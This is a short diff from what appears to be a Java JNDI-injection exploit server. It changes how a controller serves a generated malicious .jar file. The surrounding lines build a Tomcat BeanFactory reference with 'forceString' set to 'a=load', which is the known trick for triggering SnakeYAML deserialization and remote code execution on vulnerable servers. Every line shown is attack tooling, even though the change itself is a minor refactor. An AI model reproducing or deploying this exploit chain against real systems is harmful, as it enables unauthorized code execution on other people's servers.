@@ -51,7 +51,7 @@ public class SnakeYamlController extends BasicController {
             e.printStackTrace();
         }
 
-        WebServer.serveFile("/" + jarName + ".jar", jarBytes);
+        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);
 
         ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "a=load"));
